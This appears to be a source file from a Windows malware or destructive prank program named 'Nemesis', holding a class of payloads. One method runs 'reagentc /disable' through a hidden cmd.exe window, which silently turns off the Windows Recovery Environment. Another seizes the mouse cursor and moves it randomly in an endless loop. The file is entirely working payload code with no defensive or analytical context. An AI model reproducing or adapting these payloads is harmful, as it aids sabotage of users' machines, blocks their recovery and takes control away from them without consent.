using System.Diagnostics;
using static Windows.APIs;

namespace Nemesis
{
    public class PayloadsSystem
    {
        public static Process DisableWinRe()
        {
            // Disable Windows RE
            var dwr = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                WindowStyle = ProcessWindowStyle.Hidden,
                Arguments = "/c reagentc /disable",
            };

            return Process.Start(dwr);
        }

        public static void MoveMouseRandom()
        {
            while (true)
            {
                int larguraTela = SCREEN_WIDTH;
                int alturaTela = SCREEN_HEIGHT;
                int novoX = rand.Next(larguraTela);
                int novoY = rand.Next(alturaTela);
                SetCursorPos(novoX, novoY);
            }
        }
       
    }
}